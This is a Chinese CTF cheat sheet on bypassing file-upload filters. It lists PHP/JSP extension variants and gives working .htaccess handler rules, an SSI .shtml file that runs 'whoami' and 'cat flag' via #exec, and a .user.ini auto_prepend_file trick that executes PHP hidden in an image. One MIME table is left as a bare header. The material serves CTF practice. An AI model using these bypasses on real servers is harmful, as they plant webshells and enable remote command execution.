# 文件上传ctf解题思路

> 🎯 本文按「常见的上传文件 → 绕过思路 → 内容层面绕过 → 进阶利用 → 实战案例」的顺序，把文件上传题可用的后缀和绕过手法整理成速查清单，便于做题时按顺序逐项尝试。

## 常见的上传文件

| 类别 | 后缀 |
|------|------|
| PHP 系 | `.php`、`.php2`、`.php3`、`.php4`、`.php5`、`.php7`、`.phtml`、`.inc`、`.sap` |
| JSP 系 | `.jsp`、`.jspx`、`jspf` |
| 配置文件 | `.htaccess`、`.user.ini` |
| 大小写变形 | `.PHP`、`.Php`、`.pHp` |
| 图片后缀 | `.jpg`、`.png`、`.gif` |

> 💡 大小写变形和后缀变体是黑名单绕过的第一层思路，`.inc`、`.sap`、`jspf` 这类不常见的后缀尤其值得先试。

| 文件类型 | 后缀 | MIME 类型 |

#### .htaccess绕过

`.htaccess` 文件，是 apache 服务器的一个配置文件，全称是 Hypertext Access (超文本入口)，提供了针对目录改变配置的方法。

`.htaccess` 文件可以修改 apache 的配置，但仅作用于当前目录。

前提

`/etc/apache2/apache2.conf`

访问httpd.conf文件

原配置：

```apache
Options FollowSymLinks
AllowOverride None
```

改为：

```apache
Options FollowSymLinks
AllowOverride All
```

把这行的#号去掉LoadModule rewrite_module modules/mod_rewrite.so

##### 让指定的文件被解析成php文件

通过此.htaccess 文件调用 php 的解析器去解析一个文件名中只要包含 "webshell.png" 这个字符串的任意文件。所以无论文件名是什么样子，只要包含 "webshell.png" 这个字符串，都可以被以php 的方式来解析。

```apache
<FilesMatch "webshell.png">
setHandler application/x-httpd-php
</FilesMatch>
```

任意文件都当成php解析

```apache
<FilesMatch "^">
setHandler application/x-httpd-php
</FilesMatch>
```

或者 过滤ph字符的情况下

```apache
<FilesMatch "^">
setHandler application/x-httpd-p\
hp
</FilesMatch>
```

```apache
AddType application/x-httpd-php .xx #将.xx类文件按照php代码解析执行
AddHandler php5-script .xx #将.xx类文件按照php代码解析执行 //这2个直接写，不用包裹。
```

##### shtml

SHTML 是使用 SSI（Server Side Include）的 HTML 文件扩展名。SSI（Server Side Include）通常称为“服务器端嵌入”或者叫“服务器端包含”，是一种类似于 ASP 的基于服务器的网页制作技术。

SSI 就是嵌入在 html 里的服务器小段脚本，后缀 shtml，Apache 的 mod_include 解析；开启+Includes时，#exec可以直接执行系统命令，CTF 上传绕过 php 黑名单的经典手段。

```bash
激活include模块，并重启httpd
a2enmod include

重启httpd
service apache2 restart

验证模块是否加载成功
apache2ctl -M | grep include
显示
include_module (shared)
```

```apache
配置.htaccess，内容如下：
AddType text/html .shtml
AddHandler server-parsed .shtml
Options Includes
```

```html
配置1.shtml，内容如下：
<pre>
<!--#exec cmd="whoami" --> // <!--#exec cmd="cat flag" -->
</pre>
```

#### .user.ini绕过

user.ini是 PHP 中的一个特殊配置文件，它允许在特定目录下覆盖全局的 *php.ini* 配置。这种文件通常用于在不同的目录下设置不同的 PHP 配置，类似于 Apache 的 *.htaccess* 文件。*user.ini* 文件的使用非常灵活，它不仅适用于 Apache 服务器，也适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式。

*user.ini* 文件可以包含多种 PHP 配置项，例如 *auto_prepend_file* 和 *auto_append_file*，这两个配置项可以在 PHP 文件执行前后自动包含指定的文件，相当于实现了文件包含。这种功能可以用于构造后门或隐藏后门。然而，*user.ini* 文件的作用范围有限，它只能影响同一目录下的 PHP 文件。如果需要在其他目录下包含文件，可能需要使用相对路径（如 *../*）来实现。（上传完不是立即实现，等5分钟，必须有一个可访问的php文件）

```ini
auto_prepend_file = <filename> //包含在文件头,推荐
auto_append_file = <filename> //包含在文件尾
```

```ini
例如
在.user.ini中写入
auto_prepend_file = 1.jpg

文件1.jpg中写入<?php phpinfo();?>

要求此目录中有任意一个php文件且可以访问，访问后会显phpinfo的页面
```

> ⚠️ `.user.ini` 生效有延迟（约 5 分钟），且目录下必须存在一个可访问的 php 文件，否则不会触发。
